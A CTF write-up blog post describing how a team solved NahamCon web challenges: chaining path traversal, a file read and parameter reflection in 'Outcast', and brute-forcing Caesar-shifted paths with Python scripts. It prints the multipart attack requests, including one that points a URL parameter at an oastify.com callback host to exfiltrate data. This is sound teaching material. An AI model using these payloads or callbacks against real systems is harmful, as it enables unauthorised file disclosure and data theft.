---
layout: post
title: Writeups NahamCon CTF -- Harder Web Challenges
date: 2025-05-28 03:30:00
tags: 
- rev
- web
- ctf
- writeup
---

<p class="meta">May 28 2024 - Web and Rev Challenges - NahamCon CTF Writeup Pt 2</p>

# NahamCon CTF

I fought in this war on team [Onlyfeet](https://ctftime.org/team/144644/), which I'm a part of. Yeah, I'm cool I promise. Here's some writeups, have fun. 

Long live the feet lovers. 

# Outcast

*This challenge was solved as a team effort with Tib3rius and 0xm1rch.*

Outcast is a web challenge provided by YesWeHack with an interesting twist - it's designed to be run as a black-box environment with no source code provided. The challenge allows light enumeration and features a non-standard flag format using l33tsp3@k inside the flag{} wrapper.

## Challenge Overview

YesWeHack states: "This challenge is meant to be run as a black-box environment. The source code is intentionally not provided."

**Important Note**: The flag for this challenge is not in the standard format. The flag uses `flag{}` wrapper but contains _l33tsp3@k!_ inside the curly braces.

Light enumeration is permitted for this challenge.

## Initial Reconnaissance

During our initial exploration of the application, we discovered several endpoints:
- `/` - Home page
- `/login` - Dashboard/login functionality  
- `/info` - Information page

## Hidden Endpoint Discovery

On the `/info` page, inspecting the source code revealed a commented-out endpoint that "should not be accessible":

```html
<div class="hidden sm:ml-6 sm:block">
    <div class="flex space-x-4">
        <a href="/" class="rounded-md bg-red-700 px-3 py-2 text-sm font-medium text-white hover:bg-red-500 hover:scale-110">Home</a>
        <a href="/login" class="rounded-md bg-red-700 px-3 py-2 text-sm font-medium text-white hover:bg-red-500 hover:scale-110">Dashboard</a>
        <a href="/info" class="rounded-md bg-red-700 px-3 py-2 text-sm font-medium text-white hover:bg-red-500 hover:scale-110">Info</a>
        <!-- note: should not be accessable -->
        <!-- <a href="/test" class="rounded-md px-3 py-2 text-sm font-medium text-gray-300 hover:bg-gray-700 hover:text-white">Test</a> -->
    </div>
</div>
```

This revealed the existence of a `/test` endpoint that was hidden from the main navigation.

## Exploring the /test Endpoint

Accessing the `/test` endpoint revealed functionality that appeared to be some kind of API caller or request handler. Through testing and experimentation, we discovered we could send multipart form data with specific parameters.

## Initial Exploitation Attempt

Our first attempt involved trying to exploit what appeared to be a Server-Side Request Forgery (SSRF) vulnerability. We crafted a request with the following payload:

```
------WebKitFormBoundaryr5p1zI5sws0O9r7B
Content-Disposition: form-data; name="userid"

@/tmp/../flag.txt
------WebKitFormBoundaryr5p1zI5sws0O9r7B
Content-Disposition: form-data; name="method"

../login    
------WebKitFormBoundaryr5p1zI5sws0O9r7B
Content-Disposition: form-data; name="parameters"

$this->url=http://e3ijv6uyn2zgtrtxwpevakr7xy3prlfa.oastify.com
------WebKitFormBoundaryr5p1zI5sws0O9r7B--
```

This generated an interesting error message that revealed internal application structure:

```
Fatal error: Uncaught Exception: URL using bad/illegal format or missing URL in /var/www/html/modules/apicaller.php:45
Stack trace:
#0 /var/www/html/test/index.php(16): APICaller->__call('../login    ', Array, $this->url: 'http://e3ijv6uy...')
#1 {main}
  thrown in /var/www/html/modules/apicaller.php on line 45
```

## Understanding the Application Architecture

From the error message, we learned:
1. The application uses an `APICaller` class in `/var/www/html/modules/apicaller.php`
2. The `/test` endpoint can call other methods/endpoints
3. There's a private `$url` variable that we couldn't directly modify
4. Path traversal was possible in the `method` parameter

## The Breakthrough: Parameter Reflection

Since we couldn't exfiltrate the flag via HTTP requests due to the private `$url` variable restriction, we looked for ways to reflect the flag value in HTTP responses. We discovered that the `/login` endpoint reflects the username parameter in the HTML response.

## Final Exploitation

Our winning strategy involved chaining multiple vulnerabilities:

1. **Path Traversal**: Use `../login/` in the method parameter to access the login endpoint
2. **File Inclusion**: Use `@/tmp/../flag.txt` as the username value to read the flag file
3. **Parameter Reflection**: The login endpoint reflects the username in the response

**Finl Request Payload**:
```
------WebKitFormBoundaryr5p1zI5sws0O9r7B
Content-Disposition: form-data; name="userid"

admin
------WebKitFormBoundaryr5p1zI5sws0O9r7B
Content-Disposition: form-data; name="method"

../login/
------WebKitFormBoundaryr5p1zI5sws0O9r7B
Content-Disposition: form-data; name="parameters"

username=@/tmp/../flag.txt
------WebKitFormBoundaryr5p1zI5sws0O9r7B--
```

## Success!

The response revealed the flag reflected in the username field:

```html
<div class="mt-2">
    <input
        type="text"
        name="username"
        id="username"
        value="FLAG{ch41ning_bug$_1s_W0nd3rful!}"
        required
    />
</div>
```

**Flag**: `FLAG{ch41ning_bug$_1s_W0nd3rful!}`

## Key Takeaways
Written with AI Support

This challenge demonstrated several important concepts:

- **Black-box Testing**: Working without source code and relying on enumeration and error messages
- **Information Disclosure**: Using error messages to understand application architecture
- **Vulnerability Chaining**: Combining path traversal, file inclusion, and parameter reflection
- **Alternative Exploitation Methods**: When direct exfiltration isn't possible, finding creative ways to reflect data
- **Hidden Endpoint Discovery**: The importance of thorough source code inspection during reconnaissance

The challenge name "Outcast" was fitting - we had to think outside the box and chain multiple seemingly minor vulnerabilities to achieve our goal. The collaboration between team members was crucial in identifying the reflection mechanism that made the final exploitation possible.

# My First CTF, My Second CTF, and My Third CTF

*The initial introspection was a collaborative effort with piratemoo and Tib3rius.*

These three challenges - My First CTF, My Second CTF, and My Third CTF - formed a series that initially appeared to be steganography challenges but turned out to be enumeration challenges with a twist involving Caesar ciphers.

## Challenge Overview

The organizers provided us with a wordlist to use for these challenges. All three challenges presented the same basic structure:
- A simple webpage with a single JPG image called `rotten.jpg`
- The image itself contained no useful steganographic data
- The real challenge was in directory enumeration with Caesar cipher variations

## Initial Analysis

### The Rotten Image

Each challenge displayed a single image file called `rotten.jpg`. Our first instinct was to analyze this image for hidden data using various steganography techniques.

Using `exiftool` on the image revealed interesting metadata, highlights being:
```
Profile CMM Type                : Apple Computer Inc.
Profile Version                 : 2.1.0
```

This "Apple Computer Inc." artifact initially seemed like it might be a clue (apples being rotten), but it turned out to be a red herring that led us down the wrong path initially.

### The Flag.txt Red Herring

Navigating to `/flag.txt` on each challenge gave us a taunting "Ha, you wish!" response. We unfortunately spent less time than we should have thinking about this, thinking it was just a troll.

![Flag.txt Response](/assets/ctf/nahamcon-2025/my#ctf/flag.txt.png)

## The Breakthrough: ROT Cipher Connection

The key insight came when we connected the challenge name theme with the image name:
- **rotten** → *"rot"* + *"ten"* → **ROT10**

This led us to realize that the challenges might involve Caesar cipher variations (ROT ciphers) applied to directory/file enumeration.

## Solution Approach

After trying various steganography techniques and reverse engineering approaches on the image, we discovered that these were actually enumeration challenges. The twist was that the valid endpoints were Caesar cipher variations of common directory/file names.

All three challenges followed the same pattern but used different Caesar cipher shifts.

## Automated Solution Script

I developed a Python script to automate the solution process. The script evolved over time as I solved each challenge, and wanted things to go faster. After a lot of playing around, here is what I came up with, both initially and at the end:

### Initial Script Version

```python
import requests
import urllib.parse

def rot_encrypt(text, s):
    """
    Encrypts or decrypts text using the Caesar cipher (ROT).
    Args:
        text (str): The input string to be processed.
        s (int): The shift value (0-25).
    Returns:
        str: The rotated string.
    """
    result = ""
    for char in text:
        if 'A' <= char <= 'Z':  # Check for uppercase letters
            # Apply shift for uppercase letters
            result += chr(((ord(char) - ord('A') + s) % 26) + ord('A'))
        elif 'a' <= char <= 'z':  # Check for lowercase letters
            # Apply shift for lowercase letters
            result += chr(((ord(char) - ord('a') + s) % 26) + ord('a'))
        else:
            result += char  # Keep non-alphabetic characters as they are
    return result

def fetch_and_rot_path_and_content(base_url, original_custom_path, headers=None):
    print(f"Starting ROT brute-force on path '{original_custom_path}' for base URL: {base_url}")
    if headers:
        print("Using custom headers.")

    for s in range(26):
        rotated_path = rot_encrypt(original_custom_path, s) + ".jpg"
        # NOTE: Comment out .jpg if you want to test the path without the file extension. 

        full_url = urllib.parse.urljoin(base_url, rotated_path)

        print(f"\n--- ROT {s:02d} ---")
        print(f"Requesting URL: {full_url}")

        print('loop!')
        response = requests.get(full_url, headers=headers, timeout=10)
        print(f"Response status code: {response.status_code}")

if __name__ == "__main__":
    base_url = 'http://challenge.nahamcon.com:31412/'

    print("Enter the custom path to ROTate and append (e.g., 'ebggra'):")
    original_custom_path_input = input()

    custom_headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'DNT': '1',
        'Sec-GPC': '1',
        'Priority': 'u=0, i'
    }

    fetch_and_rot_path_and_content(base_url, original_custom_path_input, custom_headers)
```

### Final Optimized Script

```python
import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

def rot_encrypt(text, s):
    result = ""
    for char in text:
        if 'a' <= char <= 'z':  # Check for lowercase letters
            # Apply shift for lowercase letters
            result += chr(((ord(char) - ord('a') + s) % 26) + ord('a'))
        else:
            result += char  # Keep non-alphabetic characters as they are
    return result

def _fetch_single_rot_url(base_url, original_custom_path, s, headers=None):
    rotated_path = rot_encrypt(original_custom_path, s)
    full_url = urllib.parse.urljoin(base_url, rotated_path)
    response = requests.get(full_url, headers=headers, timeout=10)
    return s, full_url, response

def fetch_and_rot_path_and_content(base_url, original_custom_path, headers=None):
    print(f"Starting ROT brute-force on path '{original_custom_path}' for base URL: {base_url}")
    if headers:
        print("Using custom headers.")

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(_fetch_single_rot_url, base_url, original_custom_path, s, headers): s for s in range(26)}

        for future in as_completed(futures):
            s, full_url, response = future.result() 

            if response.status_code == 404:
                continue 
            
            # If not 404, match found
            print(f"\n--- ROT {s:02d} ---")
            print(f"Requesting URL: {full_url}")
            print("Response status code: 200 OK") # Keep orig
            print("Response content:")
            print(response.text)
            exit(0) # first non-404 response

if __name__ == "__main__":
    base_url = 'http://challenge.nahamcon.com:32751/'

    print("wordlist path:")
    wordlist_file_path = input()

    with open(wordlist_file_path, 'r') as f:
        for line_num, line in enumerate(f, 1):
            original_path = line.strip()
            if original_path: 
                print(f"\n--- Processing entry {line_num}: '{original_path}' from wordlist ---")
                fetch_and_rot_path_and_content(base_url, original_path)
```

## How It Worked
Written with AI Support

The script automated the following process:

1. **Wordlist Processing**: Read each entry from the provided wordlist
2. **ROT Cipher Generation**: For each wordlist entry, generate all 26 possible Caesar cipher variations (ROT0 through ROT25)
3. **Concurrent Testing**: Use threading to test all 26 variations simultaneously for faster execution
4. **Success Detection**: Stop and display results when a non-404 response is found

## Success!

The script successfully solved all three challenges by finding the correct Caesar cipher shifts for the hidden endpoints:

![My Third CTF Solve](/assets/ctf/nahamcon-2025/my#ctf/mythirdctfsolve.png)

## Key Takeaways
Written with AI Support

These challenges taught us several important lessons:

- **Don't Over-Complicate**: Sometimes the simplest explanation is correct - these weren't complex steganography challenges
- **Pattern Recognition**: The "rotten" → "ROT" connection was the key insight
- **Automation is Key**: Writing scripts to automate repetitive tasks (like testing 26 cipher variations) saves significant time
- **Red Herrings**: The Apple Computer Inc. metadata and /flag.txt responses were intentional distractions
- **Collaboration**: Working as a team allowed us to bounce ideas off each other and avoid getting stuck in tunnel vision

The progression from My First CTF to My Third CTF demonstrated how the same core concept could be applied with different parameters, and how building reusable automation tools can make solving similar challenges much more efficient.

These challenges were a fun introduction to Caesar ciphers in the context of web enumeration, and showed how classic cryptographic concepts can be applied in unexpected ways during CTF competitions.

